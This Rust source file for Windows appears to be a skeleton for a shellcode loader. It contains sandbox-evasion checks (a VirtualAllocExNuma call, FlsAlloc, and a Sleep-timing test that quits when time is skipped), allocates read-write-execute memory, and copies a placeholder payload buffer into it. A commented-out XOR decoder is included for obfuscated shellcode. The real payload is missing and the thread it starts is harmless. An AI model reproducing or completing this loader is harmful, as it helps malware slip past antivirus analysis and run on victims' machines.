extern crate windows;
use windows::{
    // core::*,
    // Win32::Foundation::*,
    Win32::System::Threading::*,
    // Win32::UI::WindowsAndMessaging::*,
    Win32::System::Memory::*,
    Win32::System::WindowsProgramming::INFINITE,
};
// use std::ptr::*;
// use std::mem::MaybeUninit;
// use std::time::{Instant, Duration};
use std::time::{Instant};


unsafe extern "system" fn callback(_lp_fls_data: *const std::ffi::c_void) {
    // Your callback logic here
}

fn main() {
    let mem = unsafe {
        VirtualAllocExNuma(
            GetCurrentProcess(),
            Some(0 as *mut _),
            0x1000,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_EXECUTE_READWRITE.0,
            0,
        )
    };

    if mem.is_null() {
        return;
    }

    let fls_index = unsafe {
        FlsAlloc(Some(callback))
    };

    if fls_index == 0xFFFFFFFF {
        return;
    }

    let t1 =  Instant::now();
    unsafe {
        Sleep(2000);
    }

    let t2 = (Instant::now() - t1).as_secs_f64();
    if t2 < 1.5 {
        return;
    }

    let buf: [u8; 2] = [0x8b, 0x3f];
    // de_xor(buf);
    let size = buf.len();

    let addr = unsafe {
        VirtualAlloc(
            Some(0 as *mut _),
            0x1000,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_EXECUTE_READWRITE,
        )
    };

    unsafe { std::ptr::copy_nonoverlapping(buf.as_ptr(), addr as *mut u8,  size) };

    let _thread_id = unsafe {
        extern "system" fn worker_thread(lp_thread_parameter: *mut ::std::os::raw::c_void) -> u32 {
            println!("Thread started!");
            println!("Thread parameter: {:?}", lp_thread_parameter);
            0
        }

        let t_handle = CreateThread(
            Some(0 as *mut _), 
            0, 
            Some(worker_thread), 
            Some(addr), 
            THREAD_CREATION_FLAGS(0), 
            Some(0 as *mut _),
        );

        if t_handle.is_err() {
            return;
        }

        WaitForSingleObject(t_handle.unwrap(), INFINITE);
    };
    // println!("{}", de_xor(&mut buf).len() )
}

// fn de_xor(input: &mut [u8]) -> &[u8] {
//     let encrytor: u8 = 0x77;
//     for i in 0..input.len() {
//         input[i] ^= encrytor;
//     }
//     input
// }
